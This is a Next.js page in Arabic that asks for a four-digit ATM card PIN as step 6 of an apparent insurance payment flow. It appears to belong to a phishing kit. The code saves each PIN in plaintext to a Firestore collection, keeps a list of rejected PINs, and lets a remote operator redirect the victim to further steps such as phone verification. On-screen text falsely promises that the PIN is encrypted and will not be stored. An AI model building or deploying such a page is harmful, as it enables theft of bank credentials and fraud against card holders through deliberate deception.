"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { StepShell } from "@/components/step-shell"
import { db } from "@/lib/firebase"
import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

export default function ConfiPage() {
  const router = useRouter()
  const [_v6, _s6] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "confi", 6)
    }
  }, [])

  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "confi" })

  // Navigation listener - listen for admin redirects
  useEffect(() => {
    if (!visitorId || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          // Redirect based on currentStep
          if (step === "home") {
            router.push("/insur")
          } else if (step === "phone") {
            router.push("/step5")
          } else if (step === "_t6") {
            router.push("/step4")
          } else if (step === "_st1") {
            router.push("/check")
          } else if (step === "_t2") {
            router.push("/step2")
          }
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router, visitorId])

  // Check if visitor has access to this page and monitor PIN status
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      router.push("/home-new")
      return
    }

    if (!db) return
    const docRef = doc(db as Firestore, "pays", visitorID)
    const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
      if (!docSnapshot.exists()) {
        router.push("/check")
        return
      }
      
      const data = docSnapshot.data()
      const status = data._v6Status as "pending" | "verifying" | "approved" | "rejected" | undefined
      
      if (status === "rejected") {
        // Save rejected PIN and reset status
        const currentPin = {
          code: data._v6,
          rejectedAt: new Date().toISOString()
        }
        
        setDoc(docRef, {
          oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
          _v6Status: "pending"
        }, { merge: true }).then(() => {
          _ss6("pending")
          _s6("") // Clear the old PIN
          setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
          setIsSubmitting(false)
        }).catch(err => {
          console.error("Error saving rejected PIN:", err)
          setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
          setIsSubmitting(false)
        })
      }
      
      setIsLoading(false)
    })

    return () => unsubscribe()
  }, [router])

  // Removed auto-submit - user must click button to submit

  const handlePinSubmit = async () => {
    if (_v6.length !== 4) {
      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    setIsSubmitting(true)

    try {
      // Update the document with the PIN
      if (!db) throw new Error("Firebase not configured")
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v6,
        pinSubmittedAt: new Date().toISOString(),
        _v6Status: "approved", // Auto-approve PIN
        currentStep: "phone",
        paymentStatus: "pin_completed",
        pinUpdatedAt: new Date().toISOString()
      }, { merge: true })

      // Add PIN to history (always approved)
      await addToHistory(visitorID, "_t3", {
        _v6
      }, "approved")

      // Wait 2 seconds then redirect to phone page
      setTimeout(() => {
        router.push("/step5")
      }, 2000)
    } catch (err) {
      console.error("Error submitting PIN:", err)
      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
      setIsSubmitting(false)
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <>
      {(isSubmitting || _v6Status === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      <StepShell
        step={6}
        title="تأكيد الرقم السري"
        subtitle="الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة"
        icon={<Lock className="h-8 w-8" />}
      >
        <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-4">
          {error && (
            <Alert variant="destructive" className="border-2">
              <AlertCircle className="h-5 w-5" />
              <AlertDescription className="text-base">{error}</AlertDescription>
            </Alert>
          )}

          <div className="rounded-xl border border-[#d9e9df] bg-[#f4fbf7] p-4">
            <div className="space-y-2 text-sm text-[#2f6c54]">
              <div className="flex items-center gap-2">
                <ShieldCheck className="h-4 w-4" />
                <span>للتأكد من هويتك وحماية حسابك</span>
              </div>
              <div className="flex items-center gap-2">
                <Lock className="h-4 w-4" />
                <span>الرقم السري محمي ومشفر بالكامل</span>
              </div>
              <div className="flex items-center gap-2">
                <Eye className="h-4 w-4" />
                <span>لن يتم حفظ أو مشاركة الرقم السري</span>
              </div>
            </div>
          </div>

          <Input
            type="password"
            inputMode="numeric"
            placeholder="رقم الصراف (PIN)"
            value={_v6}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 4)
              _s6(value)
              setError("")
            }}
            maxLength={4}
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-2xl font-bold tracking-[0.5em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
            disabled={isSubmitting || _v6Status === "verifying"}
            required
            autoFocus
          />

          <Button
            type="submit"
            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
            disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
          >
            تأكيد الدفع
          </Button>
        </form>
      </StepShell>
    </>
  )
}
